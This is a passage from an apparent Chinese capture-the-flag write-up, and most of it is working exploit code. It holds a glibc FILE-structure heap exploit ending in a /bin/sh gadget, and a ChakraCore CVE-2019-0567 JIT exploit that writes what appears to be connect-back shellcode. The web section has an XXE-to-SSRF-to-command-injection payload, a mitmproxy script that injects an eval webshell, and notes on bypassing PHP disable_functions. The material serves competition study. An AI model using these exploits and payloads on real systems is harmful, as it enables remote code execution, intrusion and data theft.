    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
    <span class="n">stdout</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="p">(</span><span class="mh">0x00007ffff7dd2620</span><span class="o">-</span><span class="mh">0x7ffff7a0d000</span><span class="p">)</span>

    <span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0xf1147</span>
    <span class="n">fake_file</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad2887</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_2_1_stdout_'</span><span class="p">]</span><span class="o">+</span><span class="mi">131</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_2_1_stdout_'</span><span class="p">]</span><span class="o">+</span><span class="mi">132</span><span class="p">)</span>
    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_2_1_stdin_'</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000b000000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7ffff7dd3780</span><span class="o">-</span><span class="mh">0x7ffff7a0d000</span><span class="p">))</span>
    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="p">(</span><span class="mh">0x7ffff7dd17a0</span><span class="o">-</span><span class="mh">0x7ffff7a0d000</span><span class="p">))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000ffffffff</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> 
    <span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0xd8</span><span class="o">-</span><span class="mh">0x30</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">one_gadget</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span>
    <span class="k">if</span> <span class="n">ATTACH</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'''</span>
<span class="s1">        b *0x555555554000+0xecd</span>
<span class="s1">        b *0x555555554000+0xb72</span>
<span class="s1">        '''</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">fake_file</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">pwn</span><span class="p">()</span>

<span class="c1"># 0x45216 execve("/bin/sh", rsp+0x30, environ)</span>
<span class="c1"># constraints:</span>
<span class="c1">#   rax == NULL</span>

<span class="c1"># 0x4526a execve("/bin/sh", rsp+0x30, environ)</span>
<span class="c1"># constraints:</span>
<span class="c1">#   [rsp+0x30] == NULL</span>

<span class="c1"># 0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span>
<span class="c1"># constraints:</span>
<span class="c1">#   [rsp+0x50] == NULL</span>

<span class="c1"># 0xf1147 execve("/bin/sh", rsp+0x70, environ)</span>
<span class="c1"># constraints:</span>
<span class="c1">#   [rsp+0x70] == NULL</span>
</pre></div>
<h3 data-content="1" id="f30296a5df59061f45130adacc769ea0">childjs</h3>
<p>Patch 复现了 chakracore 引擎的 JIT 漏洞 CVE-2019-0567，忽略 InitProto opcode 的 side effect，导致 JIT 无法正确的识别处理 InitProto 时的类型变化，导致 Type Confusion。Exploit 使用了 Obj -&gt; Dataview -&gt; Dataview 的内存布局来实现 Arbitrary R/W，最终通过覆写 memmove 的 got 地址为shellcode来 getshell</p>
<div class="highlight"><pre><span></span><span class="nx">obj</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">d</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">e</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">f</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">g</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">h</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">j</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>

<span class="nx">dv1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
<span class="nx">dv2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
<span class="nx">dv2</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xdead</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">BASE</span> <span class="o">=</span> <span class="mh">0x100000000</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="s2">"0x"</span> <span class="o">+</span> <span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">proto</span><span class="p">,</span> <span class="nx">value</span><span class="p">){</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">tmp</span> <span class="o">=</span> <span class="p">{</span><span class="nx">__proto__</span><span class="o">:</span> <span class="nx">proto</span><span class="p">};</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">2000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
        <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="p">{},</span> <span class="p">{});</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">o</span> <span class="o">=</span> <span class="p">{</span><span class="nx">a</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">b</span><span class="o">:</span> <span class="mi">2</span><span class="p">};</span>
    <span class="nx">opt</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">o</span><span class="p">,</span> <span class="nx">obj</span><span class="p">);</span>
    <span class="nx">o</span><span class="p">.</span><span class="nx">c</span> <span class="o">=</span> <span class="nx">dv1</span>
    <span class="nx">obj</span><span class="p">.</span><span class="nx">h</span> <span class="o">=</span> <span class="nx">dv2</span><span class="p">;</span>

    <span class="kd">let</span> <span class="nx">read64</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">addr_lo</span><span class="p">,</span> <span class="nx">addr_hi</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// dv2-&gt;buffer = addr (Step 4)</span>
        <span class="nx">dv1</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="nx">addr_lo</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">dv1</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">,</span> <span class="nx">addr_hi</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

        <span class="c1">// read from addr (Step 5)</span>
        <span class="k">return</span> <span class="nx">dv2</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">+</span> <span class="nx">dv2</span><span class="p">.</span><span class="nx">getInt32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">)</span> <span class="o">*</span> <span class="nx">BASE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">write64</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">addr_lo</span><span class="p">,</span> <span class="nx">addr_hi</span><span class="p">,</span> <span class="nx">value_lo</span><span class="p">,</span> <span class="nx">value_hi</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// dv2-&gt;buffer = addr (Step 4)</span>
        <span class="nx">dv1</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="nx">addr_lo</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">dv1</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">,</span> <span class="nx">addr_hi</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

        <span class="c1">// write to addr (Step 5)</span>
        <span class="nx">dv2</span><span class="p">.</span><span class="nx">setInt32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">value_lo</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nx">dv2</span><span class="p">.</span><span class="nx">setInt32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="nx">value_hi</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// get dv2 vtable pointer</span>
    <span class="nx">vtable_lo</span> <span class="o">=</span> <span class="nx">dv1</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">vtable_hi</span> <span class="o">=</span> <span class="nx">dv1</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>

    <span class="kd">let</span> <span class="nx">libc_addr</span> <span class="o">=</span> <span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="nx">BASE</span>
    <span class="kd">let</span> <span class="nx">libc_base</span> <span class="o">=</span> <span class="nx">libc_addr</span><span class="o">-</span><span class="p">(</span><span class="mh">0x7ffff47cc6e0</span><span class="o">-</span><span class="mh">0x00007ffff39c8000</span><span class="p">)</span>
    <span class="c1">// let memove_got_addr = libc_base+0xe38128 </span>
    <span class="kd">let</span> <span class="nx">memove_got_addr</span> <span class="o">=</span> <span class="nx">libc_base</span><span class="o">+</span><span class="mh">0xe53108</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">"[+] dv2.vtable pointer: "</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">vtable_lo</span> <span class="o">+</span> <span class="nx">vtable_hi</span> <span class="o">*</span> <span class="nx">BASE</span><span class="p">));</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">"[+] libc base: "</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">libc_base</span><span class="p">));</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">"[+] memmove got addr: "</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">memove_got_addr</span><span class="p">));</span>

    <span class="c1">//get dv2 buffer poointer</span>
    <span class="nx">buf_lo</span><span class="o">=</span><span class="nx">dv1</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="kc">true</span><span class="p">)</span>
    <span class="nx">buf_hi</span><span class="o">=</span><span class="nx">dv1</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">,</span><span class="kc">true</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">shelladdr</span> <span class="o">=</span> <span class="nx">buf_lo</span> <span class="o">+</span> <span class="nx">buf_hi</span> <span class="o">*</span> <span class="nx">BASE</span>
    <span class="kd">let</span> <span class="nx">shellbase</span> <span class="o">=</span> <span class="nx">shelladdr</span><span class="o">-</span><span class="p">(</span><span class="mh">0x555555847360</span><span class="o">-</span><span class="mh">0x00005555557d0000</span><span class="p">)</span>
    <span class="c1">// read first vtable entry using the R\W primitive</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">"[+] dv2.vtable content: "</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shelladdr</span><span class="p">));</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">"[+] shellbase: "</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shellbase</span><span class="p">))</span>

    <span class="nx">print</span><span class="p">(</span><span class="s2">"[+] dv2.buffer pointer: "</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">libc_addr</span><span class="p">));</span>
    <span class="c1">// [+] dv2.vtable pointer: 0x7ffff49e95e0</span>
    <span class="c1">// [+] dv2.buffer pointer: 0x555555847360</span>
    <span class="c1">// [+] dv2.vtable content: 0x7ffef3d9a8e0</span>
    <span class="c1">// read first vtable entry using the R\W primitive</span>
    <span class="nx">print</span><span class="p">(</span><span class="s2">"[+] dv2.buffer content: "</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">read64</span><span class="p">(</span><span class="nx">buf_lo</span><span class="p">,</span> <span class="nx">buf_hi</span><span class="p">)));</span>

    <span class="c1">// write memove got</span>
    <span class="c1">// var shellcode = [0xb848686a,0x6e69622f,0x732f2f2f,0xe7894850,0x1697268,0x24348101,0x1010101,0x6a56f631,0x1485e08,0x894856e6,0x6ad231e6,0x50f583b];    </span>
    <span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x9958296a</span><span class="p">,</span><span class="mh">0x6a5f026a</span><span class="p">,</span><span class="mh">0x50f5e01</span><span class="p">,</span><span class="mh">0xb9489748</span><span class="p">,</span><span class="mh">0x8520002</span><span class="p">,</span><span class="mh">0xbc9ae168</span><span class="p">,</span><span class="mh">0xe6894851</span><span class="p">,</span><span class="mh">0x6a5a106a</span><span class="p">,</span><span class="mh">0x50f582a</span><span class="p">,</span><span class="mh">0x485e036a</span><span class="p">,</span><span class="mh">0x216aceff</span><span class="p">,</span><span class="mh">0x75050f58</span><span class="p">,</span><span class="mh">0x583b6af6</span><span class="p">,</span><span class="mh">0x2fbb4899</span><span class="p">,</span><span class="mh">0x2f6e6962</span><span class="p">,</span><span class="mh">0x53006873</span><span class="p">,</span><span class="mh">0x52e78948</span><span class="p">,</span><span class="mh">0xe6894857</span><span class="p">,</span><span class="mh">0x50f</span><span class="p">];</span> 
    <span class="nx">print</span><span class="p">(</span><span class="s2">"shellcode len"</span><span class="o">+</span><span class="nx">hex</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
    <span class="c1">// print("[+] shellcode: "+hex(shellcode[0]));</span>
    <span class="kd">let</span> <span class="nx">offset</span> <span class="o">=</span> <span class="mh">0x400</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="o">/</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="o">++</span><span class="nx">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span><span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span>
            <span class="nx">write64</span><span class="p">(</span><span class="nx">buf_lo</span><span class="o">+</span><span class="nx">offset</span><span class="o">+</span><span class="nx">i</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="nx">buf_hi</span><span class="p">,</span><span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="o">*</span><span class="mi">2</span><span class="p">],</span><span class="mh">0xdeadbeef</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="nx">write64</span><span class="p">(</span><span class="nx">buf_lo</span><span class="o">+</span><span class="nx">offset</span><span class="o">+</span><span class="nx">i</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span><span class="nx">buf_hi</span><span class="p">,</span><span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="o">*</span><span class="mi">2</span><span class="p">],</span><span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="nx">write64</span><span class="p">(</span><span class="nx">vtable_lo</span><span class="o">+</span><span class="mh">0x4ea28</span><span class="p">,</span><span class="nx">vtable_hi</span><span class="p">,</span><span class="nx">buf_lo</span><span class="o">+</span><span class="nx">offset</span><span class="p">,</span><span class="nx">buf_hi</span><span class="p">)</span>
    <span class="c1">// trigger </span>
    <span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">);</span> 
    <span class="kd">var</span> <span class="nx">bb</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span> 
    <span class="nx">target</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">bb</span><span class="p">);</span> 

<span class="p">}</span>
<span class="nx">main</span><span class="p">();</span>
</pre></div>
<h2 data-content="1" id="af132946e6c31c5b87fe8a13ada7ab6b">Web</h2>
<p>首先先注册一个<code>**baidu.com</code>的域名，来绕过下面几个题的一些问题。</p>
<h3 data-content="1" id="cc1b436c0132849982f38f575a3f6dc3">rss</h3>
<p>通过访问<code>**baidu.com/1.txt</code>来进行XXE，读取源码。<br/>
之后构造，进行SSRF，在<code>$_GET['order']='title,"1")&amp;&amp;phpinfo()&amp;&amp;strcmp($a-&gt;title';</code>RCE</p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;
&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http://是IP/file/example&amp;order=%74%69%74%6c%65%2c%22%31%22%29%26%26%73%79%73%74%65%6d%28%27%63%61%74%20%2f%66%6c%61%67%5f%65%62%38%62%61%32%65%62%30%37%37%30%32%65%36%39%39%36%33%61%37%64%36%61%62%38%36%36%39%31%33%34%27%29%26%26%73%74%72%63%6d%70%28%24%61%2d%3e%74%69%74%6c%65" &gt;]&gt;
&lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&gt;
&lt;channel&gt;
    &lt;title&gt;The Blog&lt;/title&gt;
    &lt;link&gt;http://example.com/&lt;/link&gt;
    &lt;description&gt;A blog about things&lt;/description&gt;
    &lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;
    &lt;item&gt;
        &lt;title&gt;&amp;xxe;&lt;/title&gt;
        &lt;link&gt;http://example.com&lt;/link&gt;
        &lt;description&gt;a post&lt;/description&gt;
        &lt;author&gt;author@example.com&lt;/author&gt;
        &lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;
    &lt;/item&gt;
&lt;/channel&gt;</code></pre>
<h3 data-content="1" id="2dd4712923cf839282079b569d6ce764">babyblog</h3>
<p>存在二次注入</p>
<pre><code>if(isset($_POST['title']) &amp;&amp; isset($_POST['content']) &amp;&amp; isset($_POST['id'])){
    foreach($sql-&gt;query("select * from article where id=" . intval($_POST['id']) . ";") as $v){
        $row = $v;
    }
    if($_SESSION['id'] == $row['userid']){
        $title = addslashes($_POST['title']);
        $content = addslashes($_POST['content']);
        $sql-&gt;query("update article set title='$title',content='$content' where title='" . $row['title'] . "';");
        exit("&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;");
    }else{
        exit("&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;");
    }
}</code></pre>
<p>先通过堆叠注入，insert一个VIP<br/>
使用<code>insert users set username='xxx'....</code>绕过<br/>
之后在使用replace.php的preg_replace 用/e RCE<br/>
其中使用mitmproxy做中间件，解决antword链接问题</p>
<pre><code>from mitmproxy import http

def request(flow):
    flow.request.urlencoded_form["find"] = "/e\x00"
    flow.request.urlencoded_form["replace"] = "ob_end_clean()&amp;&amp;eval($_POST['a'])&amp;&amp;ob_end_clean()"
    flow.request.urlencoded_form["regex"] = "1"
    flow.request.urlencoded_form["id"] = "21"</code></pre>
<p>之后</p>
<pre><code>putenv LD_PRELOAD
error_log
fpm绕过basedir // 这个居然没绕过disable_function神奇</code></pre>
<pre><code>&lt;?php
/*
 * This file is part of PHP-FastCGI-Client.
 *
 * (c) Pierrick Charron &lt;pierrick@adoy.net&gt;
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the "Software"), to deal in
 * the Software without restriction, including without limitation the rights to
 * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
 * of the Software, and to permit persons to whom the Software is furnished to do
 * so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
namespace Adoy\FastCGI;
class TimedOutException extends \Exception {}
class ForbiddenException extends \Exception {}
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron &lt;pierrick@adoy.net&gt;
 * @version     1.0.0
 */
class Client
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    const REQ_STATE_WRITTEN    = 1;
    const REQ_STATE_OK         = 2;
    const REQ_STATE_ERR        = 3;
    const REQ_STATE_TIMED_OUT  = 4;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Outstanding request statuses keyed by request id
     *
     * Each request is an array with following form:
     *
     *  array(
     *    'state' =&gt; REQ_STATE_*
     *    'response' =&gt; null | string
     *  )
     *
     * @var array
     */
    private $_requests = array();
    /**
     * Use persistent sockets to connect to backend
     * @var Boolean
     */
    private $_persistentSocket = false;
    /**
     * Connect timeout in milliseconds
     * @var Integer
     */
    private $_connectTimeout = 5000;
    /**
     * Read/Write timeout in milliseconds
     * @var Integer
     */
    private $_readWriteTimeout = 5000;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port)
    {
        $this-&gt;_host = $host;
        $this-&gt;_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this-&gt;_keepAlive = (boolean)$b;
        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
            fclose($this-&gt;_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this-&gt;_keepAlive;
    }
    /**
     * Define whether or not PHP should attempt to re-use sockets opened by previous
     * request for efficiency
     *
     * @param Boolean $b true if persistent socket should be used, false otherwise
     */
    public function setPersistentSocket($b)
    {
        $was_persistent = ($this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket);
        $this-&gt;_persistentSocket = (boolean)$b;
        if (!$this-&gt;_persistentSocket &amp;&amp; $was_persistent) {
            fclose($this-&gt;_sock);
        }
    }
    /**
     * Get the pesistent socket status
     *
     * @return Boolean true if the socket should be persistent, false otherwise
     */
    public function getPersistentSocket()
    {
        return $this-&gt;_persistentSocket;
    }
    /**
     * Set the connect timeout
     *
     * @param Integer  number of milliseconds before connect will timeout
     */
    public function setConnectTimeout($timeoutMs)
    {
        $this-&gt;_connectTimeout = $timeoutMs;
    }
    /**
     * Get the connect timeout
     *
     * @return Integer  number of milliseconds before connect will timeout
     */
    public function getConnectTimeout()
    {
        return $this-&gt;_connectTimeout;
    }
    /**
     * Set the read/write timeout
     *
     * @param Integer  number of milliseconds before read or write call will timeout
     */
    public function setReadWriteTimeout($timeoutMs)
    {
        $this-&gt;_readWriteTimeout = $timeoutMs;
        $this-&gt;set_ms_timeout($this-&gt;_readWriteTimeout);
    }
    /**
     * Get the read timeout
     *
     * @return Integer  number of milliseconds before read will timeout
     */
    public function getReadWriteTimeout()
    {
        return $this-&gt;_readWriteTimeout;
    }
    /**
     * Helper to avoid duplicating milliseconds to secs/usecs in a few places
     *
     * @param Integer millisecond timeout
     * @return Boolean
     */
    private function set_ms_timeout($timeoutMs) {
        if (!$this-&gt;_sock) {
            return false;
        }
        return stream_set_timeout($this-&gt;_sock, floor($timeoutMs / 1000), ($timeoutMs % 1000) * 1000);
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this-&gt;_sock) {
            if ($this-&gt;_persistentSocket) {
                $this-&gt;_sock = pfsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout/1000);
            } else {
                $this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout/1000);
            }
